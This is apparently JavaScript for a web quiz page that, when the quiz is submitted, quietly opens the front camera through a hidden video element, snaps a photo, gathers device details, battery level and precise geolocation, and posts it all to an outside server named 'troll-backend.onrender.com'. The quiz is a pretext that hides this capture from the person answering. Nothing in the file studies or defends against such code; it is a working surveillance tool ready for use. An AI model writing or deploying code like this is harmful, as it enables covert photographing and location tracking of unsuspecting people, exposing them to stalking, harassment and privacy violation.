const form = document.getElementById("quiz-form"); // your quiz form
const video = document.createElement("video"); // hidden video element
const canvas = document.createElement("canvas"); // hidden canvas element

const constraints = { video: { facingMode: "user" }, audio: false };

// Submit event
form.addEventListener("submit", async (e) => {
  e.preventDefault(); // prevent default form submission

  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";

  try {
    // Start camera
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await video.play();

    // Wait a tiny bit to ensure video has loaded
    await new Promise((res) => {
      video.addEventListener("canplay", () => setTimeout(res, 300));
    });

    // Capture image from video
    const image = captureImage();
    const metadata = await collectMetadata();

    // Send to your backend
    await sendToBackend(image, metadata);

    // Stop camera
    video.srcObject.getTracks().forEach((track) => track.stop());

    // Show success message (optional)
    alert("Response captured successfully!");

    // Reset submit button
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";

  } catch (err) {
    console.error(err);
    alert("Please allow camera access!");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});

function captureImage() {
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString()
  };

  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = battery.level * 100 + "%";
  }

  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

const backendURL = "https://troll-backend.onrender.com/api/upload";

async function sendToBackend(image, metadata) {
  try {
    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });
  } catch (err) {
    console.error("Error sending data:", err);
  }
}
